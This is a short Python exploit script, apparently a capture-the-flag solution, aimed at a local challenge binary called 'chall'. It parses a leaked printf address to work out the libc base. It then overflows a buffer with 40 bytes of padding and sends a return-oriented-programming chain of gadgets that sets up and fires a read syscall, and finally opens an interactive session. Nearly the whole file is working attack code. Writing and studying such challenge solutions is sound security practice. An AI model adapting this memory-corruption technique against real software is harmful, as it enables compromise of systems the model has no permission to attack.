#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
b *main+72
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

reu(b": ")
libc.address=int(rl().strip(b"\n"), 16)-libc.sym['printf']
lb()


rop = flat([

	b"A"*40,
	gadget("pop rax; ret"),
	0,
	gadget("pop rdi; ret"),
	0,
	gadget("pop rsi; ret"),
	0x4c45c0,
	gadget("pop rdx; pop rbx; ret;"),
	0x1337,
	0x1337,
	gadget("syscall")

])
sl(rop)
io.interactive()
